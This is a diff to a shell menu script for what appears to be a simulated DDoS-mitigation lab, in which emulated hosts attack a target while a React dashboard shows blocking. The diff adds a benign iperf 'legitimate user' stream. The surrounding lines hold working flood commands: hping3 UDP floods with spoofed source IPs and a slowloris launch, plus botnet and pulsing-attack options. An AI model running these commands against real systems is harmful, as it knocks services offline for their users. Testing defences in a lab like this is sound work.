@@ -34,9 +34,10 @@ show_menu() {
     echo "  [5] Dynamic Pulsing / Wave Attack   (10s ON / 5s OFF bursts)"
     echo "  [6] Coordinated Multi-IP Botnet     (Launches h2, h4-h8 simultaneously)"
     echo "  [7] Stop All Background Attacks"
+    echo "  [8] Start Legitimate User Stream    (iperf h1 -> h3 @ ~850 pkts/s baseline)"
     echo "  [0] Exit"
     echo ""
-    read -p "Enter choice [0-7]: " choice
+    read -p "Enter choice [0-8]: " choice
 }
 
 stop_attacks() {
@@ -92,14 +93,24 @@ case_launch() {
             sudo hping3 -a 10.0.0.7 --flood --udp -p 8080 $TARGET_IP >/dev/null 2>&1 &
             sudo hping3 -a 10.0.0.8 --flood --udp -p 53 $TARGET_IP >/dev/null 2>&1 &
             python3 "$SCRIPT_DIR/slowloris.py" $TARGET_IP 80 80 >/dev/null 2>&1 &
+
+            # Ensure continuous legitimate traffic from h1 runs in parallel
+            iperf -c $TARGET_IP -u -b 10m -t 3600 >/dev/null 2>&1 &
             
-            echo "[+] Distributed Botnet active in background!"
-            echo "Observe the React Dashboard to watch all 6 attacker IPs get blocked in real-time."
+            echo "[+] Distributed Botnet active in background alongside legitimate h1 user traffic!"
+            echo "Observe the React Dashboard: All 6 attacker IPs are blocked, while legitimate h1 traffic is forwarded."
             echo "To stop: Run this menu again and choose Option [7]."
             read -p "Press Enter to return to menu..."
             ;;
         7)
             stop_attacks
+            read -p "Press Enter to return to menu..."
+            ;;
+        8)
+            echo "[*] Launching legitimate user stream from h1 to h3 (Server: $TARGET_IP)..."
+            iperf -c $TARGET_IP -u -b 10m -t 3600 >/dev/null 2>&1 &
+            echo "[+] Legitimate user stream (~850 pkts/s) active in background!"
+            echo "Inspect the React Dashboard to observe Clean Forwarded traffic green line passing through."
             read -p "Press Enter to return to menu..."
             ;;
         0)
